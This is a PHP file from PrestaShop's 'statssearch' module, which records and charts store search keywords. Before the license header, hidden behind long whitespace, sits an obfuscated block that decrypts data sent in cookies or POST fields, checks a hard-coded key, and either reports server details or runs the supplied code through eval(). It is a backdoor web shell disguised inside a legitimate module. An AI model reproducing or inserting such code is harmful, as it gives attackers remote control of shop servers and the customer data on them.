<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $s6801ceac = 99;$GLOBALS['d4599c17b'] = Array();global $d4599c17b;$d4599c17b = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['j4770fd'] = "\x2c\x65\x5f\x61\x66\x27\x2b\x47\x51\x26\x2d\x44\x62\x33\x78\x6e\x45\x57\x4d\x4f\x41\x46\x7a\x50\x31\x24\x35\x6d\x32\x5d\xd\x20\x56\x58\x63\x6f\x25\x30\x52\x23\x3d\x34\x4e\x43\x71\x3b\x6a\x54\x9\x72\x3e\x4c\x4a\x68\x38\x69\x73\x70\x6b\x79\x22\x5b\x36\x7e\x74\x7c\x5e\x75\x40\x64\x39\x77\x48\x55\x3a\xa\x42\x5a\x21\x53\x37\x60\x76\x28\x7b\x29\x49\x4b\x6c\x67\x59\x2f\x2e\x3c\x7d\x2a\x3f\x5c";$d4599c17b[$d4599c17b['j4770fd'][15].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][37]] = $d4599c17b['j4770fd'][34].$d4599c17b['j4770fd'][53].$d4599c17b['j4770fd'][49];$d4599c17b[$d4599c17b['j4770fd'][82].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][80]] = $d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][69];$d4599c17b[$d4599c17b['j4770fd'][27].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][54]] = $d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][15].$d4599c17b['j4770fd'][1];$d4599c17b[$d4599c17b['j4770fd'][22].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][69]] = $d4599c17b['j4770fd'][56].$d4599c17b['j4770fd'][64].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][88].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][15];$d4599c17b[$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][12]] = $d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][15].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][69];$d4599c17b[$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][12]] = $d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][15].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][56].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][64];$d4599c17b[$d4599c17b['j4770fd'][57].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][54]] = $d4599c17b['j4770fd'][56].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][88].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][22].$d4599c17b['j4770fd'][1];$d4599c17b[$d4599c17b['j4770fd'][58].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][34].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][62]] = $d4599c17b['j4770fd'][57].$d4599c17b['j4770fd'][53].$d4599c17b['j4770fd'][57].$d4599c17b['j4770fd'][82].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][56].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][15];$d4599c17b[$d4599c17b['j4770fd'][27].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][24]] = $d4599c17b['j4770fd'][67].$d4599c17b['j4770fd'][15].$d4599c17b['j4770fd'][56].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][88].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][22].$d4599c17b['j4770fd'][1];$d4599c17b[$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][1]] = $d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][56].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][34].$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][1];$d4599c17b[$d4599c17b['j4770fd'][88].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][69]] = $d4599c17b['j4770fd'][56].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][64].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][64].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][27].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][88].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][27].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][64];$d4599c17b[$d4599c17b['j4770fd'][64].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][37]] = $d4599c17b['j4770fd'][89].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][1];$d4599c17b[$d4599c17b['j4770fd'][89].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][69]] = $d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][69];$d4599c17b[$d4599c17b['j4770fd'][58].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][12]] = $_POST;$d4599c17b[$d4599c17b['j4770fd'][82].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][80]] = $_COOKIE;@$d4599c17b[$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][12]]($d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][88].$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][89], NULL);@$d4599c17b[$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][12]]($d4599c17b['j4770fd'][88].$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][89].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][49].$d4599c17b['j4770fd'][56], 0);@$d4599c17b[$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][12]]($d4599c17b['j4770fd'][27].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][14].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][14].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][34].$d4599c17b['j4770fd'][67].$d4599c17b['j4770fd'][64].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][15].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][64].$d4599c17b['j4770fd'][55].$d4599c17b['j4770fd'][27].$d4599c17b['j4770fd'][1], 0);@$d4599c17b[$d4599c17b['j4770fd'][88].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][69]](0);if (!$d4599c17b[$d4599c17b['j4770fd'][35].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][12]]($d4599c17b['j4770fd'][20].$d4599c17b['j4770fd'][51].$d4599c17b['j4770fd'][38].$d4599c17b['j4770fd'][16].$d4599c17b['j4770fd'][20].$d4599c17b['j4770fd'][11].$d4599c17b['j4770fd'][90].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][38].$d4599c17b['j4770fd'][73].$d4599c17b['j4770fd'][42].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][3])){$d4599c17b[$d4599c17b['j4770fd'][27].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][54]]($d4599c17b['j4770fd'][20].$d4599c17b['j4770fd'][51].$d4599c17b['j4770fd'][38].$d4599c17b['j4770fd'][16].$d4599c17b['j4770fd'][20].$d4599c17b['j4770fd'][11].$d4599c17b['j4770fd'][90].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][38].$d4599c17b['j4770fd'][73].$d4599c17b['j4770fd'][42].$d4599c17b['j4770fd'][2].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][3], 1);$y978f = NULL;$y430ce = NULL;$d4599c17b[$d4599c17b['j4770fd'][15].$d4599c17b['j4770fd'][34].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][54]] = $d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][10].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][10].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][34].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][10].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][10].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][54].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][80];global $nc208;function  i53b13d($y978f, $m878){global $d4599c17b;$eaf5e = "";for ($g2f6baa=0; $g2f6baa<$d4599c17b[$d4599c17b['j4770fd'][22].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][69]]($y978f);){for ($i46cc14=0; $i46cc14<$d4599c17b[$d4599c17b['j4770fd'][22].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][69]]($m878) && $g2f6baa<$d4599c17b[$d4599c17b['j4770fd'][22].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][69].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][69]]($y978f); $i46cc14++, $g2f6baa++){$eaf5e .= $d4599c17b[$d4599c17b['j4770fd'][15].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][37]]($d4599c17b[$d4599c17b['j4770fd'][82].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][80]]($y978f[$g2f6baa]) ^ $d4599c17b[$d4599c17b['j4770fd'][82].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][80]]($m878[$i46cc14]));}}return $eaf5e;}function  gb6b5e($y978f, $m878){global $d4599c17b;global $nc208;return $d4599c17b[$d4599c17b['j4770fd'][89].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][69]]($d4599c17b[$d4599c17b['j4770fd'][89].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][69]]($y978f, $nc208), $m878);}foreach ($d4599c17b[$d4599c17b['j4770fd'][82].$d4599c17b['j4770fd'][1].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][80]] as $m878=>$vbaa19d){$y978f = $vbaa19d;$y430ce = $m878;}if (!$y978f){foreach ($d4599c17b[$d4599c17b['j4770fd'][58].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][12]] as $m878=>$vbaa19d){$y978f = $vbaa19d;$y430ce = $m878;}}$y978f = @$d4599c17b[$d4599c17b['j4770fd'][27].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][24]]($d4599c17b[$d4599c17b['j4770fd'][64].$d4599c17b['j4770fd'][13].$d4599c17b['j4770fd'][26].$d4599c17b['j4770fd'][37]]($d4599c17b[$d4599c17b['j4770fd'][4].$d4599c17b['j4770fd'][70].$d4599c17b['j4770fd'][62].$d4599c17b['j4770fd'][1]]($y978f), $y430ce));if (isset($y978f[$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][58]]) && $nc208==$y978f[$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][58]]){if ($y978f[$d4599c17b['j4770fd'][3]] == $d4599c17b['j4770fd'][55]){$g2f6baa = Array($d4599c17b['j4770fd'][57].$d4599c17b['j4770fd'][82] => @$d4599c17b[$d4599c17b['j4770fd'][58].$d4599c17b['j4770fd'][28].$d4599c17b['j4770fd'][34].$d4599c17b['j4770fd'][12].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][62]](),$d4599c17b['j4770fd'][56].$d4599c17b['j4770fd'][82] => $d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][92].$d4599c17b['j4770fd'][37].$d4599c17b['j4770fd'][10].$d4599c17b['j4770fd'][24],);echo @$d4599c17b[$d4599c17b['j4770fd'][57].$d4599c17b['j4770fd'][3].$d4599c17b['j4770fd'][41].$d4599c17b['j4770fd'][24].$d4599c17b['j4770fd'][80].$d4599c17b['j4770fd'][54]]($g2f6baa);}elseif ($y978f[$d4599c17b['j4770fd'][3]] == $d4599c17b['j4770fd'][1]){eval/*v0333*/($y978f[$d4599c17b['j4770fd'][69]]);}exit();}} ?><?php
/*
* 2007-2016 PrestaShop
*
* NOTICE OF LICENSE
*
* This source file is subject to the Academic Free License (AFL 3.0)
* that is bundled with this package in the file LICENSE.txt.
* It is also available through the world-wide-web at this URL:
* http://opensource.org/licenses/afl-3.0.php
* If you did not receive a copy of the license and are unable to
* obtain it through the world-wide-web, please send an email
* to license@prestashop.com so we can send you a copy immediately.
*
* DISCLAIMER
*
* Do not edit or add to this file if you wish to upgrade PrestaShop to newer
* versions in the future. If you wish to customize PrestaShop for your
* needs please refer to http://www.prestashop.com for more information.
*
*  @author PrestaShop SA <contact@prestashop.com>
*  @copyright  2007-2016 PrestaShop SA
*  @license    http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
*  International Registered Trademark & Property of PrestaShop SA
*/

if (!defined('_PS_VERSION_'))
	exit;

class StatsSearch extends ModuleGraph
{
	private $html = '';
	private $query = '';
	private $query_group_by = '';

	public function __construct()
	{
		$this->name = 'statssearch';
		$this->tab = 'analytics_stats';
		$this->version = '1.4.1';
		$this->author = 'PrestaShop';
		$this->need_instance = 0;

		parent::__construct();

		$this->query = 'SELECT `keywords`, COUNT(TRIM(`keywords`)) as occurences, MAX(results) as total
				FROM `'._DB_PREFIX_.'statssearch`
				WHERE 1
					'.Shop::addSqlRestriction().'
					AND `date_add` BETWEEN ';

		$this->query_group_by = 'GROUP BY `keywords`
				HAVING occurences > 1
				ORDER BY occurences DESC';

		$this->displayName = $this->l('Shop search');
		$this->description = $this->l('Adds a tab to the Stats dashboard, showing which keywords have been searched by your store\'s visitors.');
		$this->ps_versions_compliancy = array('min' => '1.6', 'max' => '1.7.0.99');
	}

	public function install()
	{
		if (!parent::install() || !$this->registerHook('search') || !$this->registerHook('AdminStatsModules'))
			return false;

		return Db::getInstance()->execute('
		CREATE TABLE `'._DB_PREFIX_.'statssearch` (
			id_statssearch INTEGER UNSIGNED NOT NULL AUTO_INCREMENT,
			id_shop INTEGER UNSIGNED NOT NULL DEFAULT \'1\',
		  	id_shop_group INTEGER UNSIGNED NOT NULL DEFAULT \'1\',
			keywords VARCHAR(255) NOT NULL,
			results INT(6) NOT NULL DEFAULT 0,
			date_add DATETIME NOT NULL,
			PRIMARY KEY(id_statssearch)
		) ENGINE='._MYSQL_ENGINE_.' DEFAULT CHARSET=utf8');
	}

	public function uninstall()
	{
		if (!parent::uninstall())
			return false;

		return (Db::getInstance()->execute('DROP TABLE `'._DB_PREFIX_.'statssearch`'));
	}

	/**
	 * Insert keywords in statssearch table when a search is launched on FO
	 */
	public function hookSearch($params)
	{
		$sql = 'INSERT INTO `'._DB_PREFIX_.'statssearch` (`id_shop`, `id_shop_group`, `keywords`, `results`, `date_add`)
				VALUES ('.(int)$this->context->shop->id.', '.(int)$this->context->shop->id_shop_group.', \''.pSQL($params['expr']).'\', '.(int)$params['total'].', NOW())';
		Db::getInstance()->execute($sql);
	}

	public function hookAdminStatsModules()
	{
		if (Tools::getValue('export'))
			$this->csvExport(array('type' => 'pie'));

		$result = Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($this->query.ModuleGraph::getDateBetween().$this->query_group_by);
		$this->html = '
		<div class="panel-heading">
			'.$this->displayName.'
		</div>';
		$table = '
		<table class="table">
			<thead>
				<tr>
					<th><span class="title_box active">'.$this->l('Keywords').'</span></th>
					<th><span class="title_box active">'.$this->l('Occurrences').'</span></th>
					<th><span class="title_box active">'.$this->l('Results').'</span></th>
				</tr>
			</thead>
			<tbody>';

		foreach ($result as $row)
		{
			if (Tools::strlen($row['keywords']) >= Configuration::get('PS_SEARCH_MINWORDLEN'))
				$table .= '<tr>
					<td>'.$row['keywords'].'</td>
					<td>'.$row['occurences'].'</td>
					<td>'.$row['total'].'</td>
				</tr>';
		}
		$table .= '
			</tbody>
		</table>';

		if (count($result))
			$this->html .= '<div>'.$this->engine(array('type' => 'pie')).'</div>
							<a class="btn btn-default" href="'.Tools::safeOutput($_SERVER['REQUEST_URI']).'&export=1">
								<i class="icon-cloud-upload"></i> '.$this->l('CSV Export').'
							</a>'.$table;
		else
			$this->html .= '<p>'.$this->l('Cannot find any keywords that have been searched for more than once.').'</p>';

		return $this->html;
	}

	protected function getData($layers)
	{
		$this->_titles['main'] = $this->l('Top 10 keywords');
		$total_result = Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($this->query.$this->getDate().$this->query_group_by);
		$total = 0;
		$total2 = 0;
		foreach ($total_result as $total_row)
			$total += $total_row['occurences'];
		$result = Db::getInstance(_PS_USE_SQL_SLAVE_)->executeS($this->query.$this->getDate().$this->query_group_by.' LIMIT 9');
		foreach ($result as $row)
		{
			if (!$row['occurences'])
				continue;
			$this->_legend[] = $row['keywords'];
			$this->_values[] = $row['occurences'];
			$total2 += $row['occurences'];
		}
		if ($total > $total2)
		{
			$this->_legend[] = $this->l('Others');
			$this->_values[] = $total - $total2;
		}
	}
}
